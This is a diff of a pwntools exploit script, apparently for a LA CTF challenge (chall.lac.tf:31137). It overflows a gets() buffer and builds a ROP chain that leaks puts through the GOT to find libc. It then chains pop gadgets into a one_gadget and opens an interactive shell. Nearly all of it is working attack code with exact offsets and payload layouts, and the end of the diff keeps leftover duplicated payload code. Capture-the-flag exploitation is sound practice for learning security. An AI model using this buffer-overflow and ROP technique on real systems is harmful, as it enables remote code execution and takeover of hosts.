@@ -1,13 +1,15 @@
 
 from pwn import *
 
+# Challenge information
 NAME = 'chall/chall'
 PORT = 31137
 URL = 'chall.lac.tf'
 FLAGFILE = 'chall/flag.txt'
 
 
-# Configuration settings for the script to launch GDB in the container
+# TMUX/Pwntools configuration
+
 TERMINAL_CONFIG = ['tmux', 'split-window', '-h', '-F', '#{pane_pid}', '-P']
 
 exe = ELF(NAME)
@@ -16,21 +18,20 @@ LIBC = ELF('chall/libc.so.6')
 LD = ELF('chall/ld-linux-x86-64.so.2')
 ENV = {"LD_PRELOAD": LIBC.path}
 context.terminal = TERMINAL_CONFIG
-context.log_level = 'debug'  # Enables printing of all traffic
+context.log_level = 'info'
 
-# readint_offset = exe.sym.read_int
-# CREATE_LEVEL_RET_OFS = 0x4011b7
-# GDB_COMMAND = f'''
-# breakrva {CREATE_LEVEL_RET_OFS} /ctf/chall/chall
-# set $readint_ofs = {readint_offset}
-# continue
-# '''
 GDB_COMMAND = '''
 break main
 set $endofmain = 0x000401382
 break *$endofmain
 continue
 '''
+
+ # Enables printing of all traffic
+if args['LOG']:
+    context.log_level = 'debug'
+
+
 
 def create_flag(flag_path):
     write(flag_path, 'THIS_IS_THE_FLAG' * 4 + '\n')
@@ -50,9 +51,11 @@ else:
     p = process([LD.path, context.binary.path], env=ENV)
 
 
-input("Enter to start")
+input("Press enter to start exploit")
 
-# Get to first payload 
+# Actual exploit 
+
+## Navigate to 'gets' overflow
 
 ## Send 1 to select multiplayer
 p.recvuntil(b"2. Multiplayer")
@@ -60,38 +63,136 @@ p.sendline(b"1")
 
 ## Receive "Enter World Name:"
 p.recvuntil(b"Enter world name:")
-# p.sendline(b"hi")
 
-# # Build first payload
+# 1. Build and send first payload -----------------------------------------------
+# Structure: | padding | rbp | nop | read_int | puts | main | 
+print("Building payload 1...")
+payload = b""
 
-# 1. Padding (64 bytes)
-padding = b'A' * 64
-# 2. Rbp (need to think about how it is affected by leave, so bss (0x404e00))
-rbp = p64(0x404e00)
-# 2.5 nop to 16 byte align stack
-nop_gadget = p64(0x4010ef)
-# 3. call read_int : exe.sym.read_int (0x401176)
-read_int = p64(exe.sym.read_int)
-# 3.5 set up rbp 
+## P1.1: Padding (64 bytes)
+padding_bytes = b'A' * 64
+payload += padding_bytes
 
-# 4. call puts in main: 0x0401367
-puts = p64(0x401243)
+## P1.2: New rbp must be writable, e.g. bss
+rbp_addr = 0x404e00
+rbp_bytes = p64(rbp_addr)
+payload += rbp_bytes
 
-# dead_beef = p64(0xdeadbeef)
+## P1.3: nop gadget, to 16 byte align stack pointer before read_int call
+nop_addr = 0x4010ef
+nop_bytes = p64(nop_addr)
+payload += nop_bytes
 
-# 5. jump back to main to get second payload (note: jump back all the way to not deal with leave shenanigans)
-main_restart = p64(0x4011BC)
+## P1.4 call read_int to read puts address into eax 
+read_int_addr = exe.sym.read_int
+read_int_bytes = p64(read_int_addr)
+payload += read_int_bytes
 
-print("Building payload")
+## P1.5 call offset into main just before puts to leak libc address and read second payload 
+main_puts_addr = 0x401243
+main_puts_bytes = p64(main_puts_addr)
+payload += main_puts_bytes
 
-payload = padding + rbp + nop_gadget + read_int + puts + main_restart
-print("First payload: ", payload)
-print("Payload length: ", len(payload))
-print("Sending first payload")
-# Send first payload
+print("Payload 1 bytes: ", payload)
+print("Payload 1 length: ", len(payload))
+
+## Send first payload
+print("Sending first payload...")
 p.sendline(payload)
 
+## Navigate to return
 print("Navigating to return...")
+
+p.recvuntil(b"2. Creative")
+p.sendline(b"1")
+
+p.recvuntil(b"2. Exit")
+
+print("Ret into the payload...")
+p.sendline(b"2")
+
+# 2. Interact with first payload to leak libc address ---------------------------------------------
+
+## Respond to read_int with GOT pointer to puts
+print("Sending GOT address to leak puts...")
+got_puts = exe.got.puts
+got_puts_str = str(got_puts)
+p.sendline(bytes(got_puts_str, 'utf-8'))
+
+## Send a line for some reason??
+p.recvline()
+
+## Receive libc puts leak, ending with newline
+leak_bytes = p.recvline()
+putc_leak = int.from_bytes(leak_bytes[:-1], 'little')
+print("Leaked puts address (in libc): ", hex(putc_leak))
+
+# 3. Calculate libc base and build second payload ---------------------------------------------
+# Structure: | padding | rbp | pop_rbp_r13 | writable addr (rbp) | NULL (r13) | pop_rdi | NULL (rdi) | one_gadget |
+print("Building payload 2...")
+
+
+# Calculate a bunch of gadgets from libc
+libc_base = putc_leak - LIBC.sym.puts
+print("Libc base: ", hex(libc_base))
+pop_rbp_r13_offset = 0x00fea7c
+pop_rbp_r13_addr = libc_base + pop_rbp_r13_offset
+print("pop_rbp_r13_addr: ", hex(pop_rbp_r13_addr))
+
+pop_rdi_offset = 0x277e5
+pop_rdi_addr = libc_base + pop_rdi_offset
+print("pop_rdi_addr: ", hex(pop_rdi_addr))
+
+one_gadget_offset = 0xd511f
+one_gadget_addr = libc_base + one_gadget_offset
+print("one_gadget_addr: ", hex(one_gadget_addr))
+
+
+payload = b""
+padding = b'A' * 64
+payload += padding
+
+## Will not be used, doesn't matter
+saved_rbp = p64(0xdeadbeef)
+payload += saved_rbp
+
+# Uses gadgets to meet one_gadget requirements
+
+## First gadget sets rbp and r13
+pop_rbp_r13_gadget = p64(pop_rbp_r13_addr)
+payload += pop_rbp_r13_gadget
+
+## For RBP, add writeable address (offset a bit forward)
+writeable_addr = p64(0x404e00+0x100)
+payload += writeable_addr
+
+## For R13 set NULL
+null_bytes = p64(0)
+payload += null_bytes
+
+## Second gadget sets rdi
+pop_rdi_gadget = p64(pop_rdi_addr)
+payload += pop_rdi_gadget
+
+## For RDI set NULL
+payload += null_bytes
+
+## Finally, one_gadget
+one_gadget = p64(one_gadget_addr)
+payload += one_gadget
+print("Payload 2 bytes: ", payload)
+print("Payload 2 length: ", len(payload))
+
+## Newline in payload will break gets() call, so warn if found
+if b'\n' in payload:
+    print("Payload contains newline at index: ", payload.index(b'\n'))
+    print("Payload: ", payload)
+    input("Press enter to try anyways...")
+    # exit(1)
+
+## 5. Send second payload and open shell ---------------------------------------------
+print("Sending second payload...")
+p.sendline(payload)
 
 # Navigate to return
 p.recvuntil(b"2. Creative")
@@ -100,26 +201,11 @@ p.sendline(b"1")
 p.recvuntil(b"2. Exit")
 p.sendline(b"2")
 
+print("Opening shell...")
+p.interactive()
+exit(0)
 
-# Respond to first payload with libc leak pointer
-got_puts = exe.got.puts
-got_puts_str = str(got_puts)
-p.sendline(bytes(got_puts_str, 'utf-8'))
 
-# Sends a line for some reason
-p.recvline()
-
-# Receive libc leak, ending with newline
-leak_bytes = p.recvline()
-print("Leak bytes: ", leak_bytes)
-putc_leak = int.from_bytes(leak_bytes[:-1], 'little')
-print("Leaked puts address: ", hex(putc_leak))
-
-# # Navigate to return
-# p.sendline(b"2")
-
-# Calculate libc base
-libc_base = putc_leak - LIBC.sym.puts
 
 # Build second payload
 # 1. (first written, bottom of stack) Padding (64 bytes)
@@ -130,17 +216,14 @@ rbp = p64(0x404e00)
 #nop_gadget = p64(0x4010ef)
 # 3. one gadget
 
-pop_rbp_r13_offset = 0x00fea7c
 pop_rbp_r13_gadget = p64(libc_base + pop_rbp_r13_offset)
 
 pop_rbp_value = p64(0x404e00+0x100) # Just needs to be witeable
 pop_r13_value = p64(0) # NULL 
 
-pop_rdi_offset = 0x277e5
 pop_rdi_gadget = p64(libc_base + pop_rdi_offset)
 pop_rdi_value = p64(0) # NULL
 
-one_gadget_offset = 0xd511f
 one_gadget = p64(libc_base + one_gadget_offset)
 
 payload = padding + rbp + pop_rbp_r13_gadget + pop_rbp_value + \
